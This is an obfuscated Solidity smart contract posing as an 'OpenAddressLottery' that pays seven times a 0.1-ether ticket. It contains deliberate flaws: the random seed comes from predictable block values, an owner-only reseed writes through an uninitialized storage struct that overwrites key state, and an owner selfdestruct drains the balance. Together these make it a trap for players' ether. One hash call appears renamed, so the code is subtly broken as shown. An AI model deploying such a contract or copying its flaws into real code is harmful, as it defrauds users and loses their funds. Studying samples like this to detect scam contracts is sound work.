// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract OpenAddressLottery{
    struct SeedComponents{
        uint _0xd9a84f;
        uint _0x9aa383;
        uint _0xd0c355;
        uint _0xa5b86d;
    }

    address _0x7fd61f; //address of the owner
    uint private _0x5384a2; //seed used to calculate number of an address
    uint private _0xdd44eb; //last reseed - used to automatically reseed the contract every 1000 blocks
    uint LuckyNumber = 7; //if the number of an address equals 7, it wins

    mapping (address => bool) _0x0a06db; //keeping track of addresses that have already won

    function OpenAddressLottery() {
        _0x7fd61f = msg.sender;
        _0xa01c9d(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0xdf5bbf() payable {
        if(msg.value<0.1 ether)
            return; //verify ticket price

        // make sure he hasn't won already
        require(_0x0a06db[msg.sender] == false);

        if(_0xaa6e27(msg.sender) == LuckyNumber){ //check if it equals 7
            _0x0a06db[msg.sender] = true; // every address can only win once

            uint _0x4111b6=msg.value*7; //win = 7 times the ticket price

            if(_0x4111b6>this.balance) //if the balance isnt sufficient...
                _0x4111b6=this.balance; //...send everything we've got
            msg.sender.transfer(_0x4111b6);
        }

        if(block.number-_0xdd44eb>1000) //reseed if needed
            _0xa01c9d(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0xaa6e27(address _0xa16362) constant returns(uint n){
        // calculate the number of current address - 1 in 8 chance
        n = uint(_0x73d5bf(uint(_0xa16362), _0x5384a2)[0]) % 8;
    }

    function _0xa01c9d(SeedComponents _0xfbe9ba) internal {
        _0x5384a2 = uint256(_0x73d5bf(
            _0xfbe9ba._0xd9a84f,
            _0xfbe9ba._0x9aa383,
            _0xfbe9ba._0xd0c355,
            _0xfbe9ba._0xa5b86d
        )); //hash the incoming parameters and use the hash to (re)initialize the seed
        _0xdd44eb = block.number;
    }

    function _0x15b846() {
        require(msg.sender==_0x7fd61f);

        selfdestruct(msg.sender);
    }

    function _0x9c7901() { //reseed initiated by the owner - for testing purposes
        require(msg.sender==_0x7fd61f);
        SeedComponents s;
        s._0xd9a84f = uint(msg.sender);
        s._0x9aa383 = uint256(block.blockhash(block.number - 1));
        s._0xd0c355 = block.difficulty*(uint)(block.coinbase);
        s._0xa5b86d = tx.gasprice * 7;

        _0xa01c9d(s); //reseed
    }

    function () payable { //if someone sends money without any function call, just assume he wanted to participate
        if(msg.value>=0.1 ether && msg.sender!=_0x7fd61f) //owner can't participate, he can only fund the jackpot
            _0xdf5bbf();
    }

}
